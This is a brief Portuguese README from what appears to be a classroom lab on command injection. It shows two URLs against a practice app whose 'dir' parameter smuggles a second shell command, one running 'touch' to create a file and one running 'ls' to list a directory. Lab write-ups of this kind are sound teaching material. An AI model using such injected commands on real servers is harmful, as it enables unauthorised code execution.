# Command Injection

Essa prática foi feita na sala de aula, consistia na injeção de comando para a criação de um arquivo com meu nome.

- Criando o arquivo no servidor:
```
http://commandinjection.herokuapp.com/?dir=folder;touch esdrasemanuel.txt
```
<div align="center"><img src="img/ci01.png" alt="" style="width:80; height:85px;"/></div>

- Listando:
```
http://commandinjection.herokuapp.com/?dir=folder;ls
```
<div align="center"><img src="img/ci02.png" alt="" style="width:80; height:85px;"/></div>
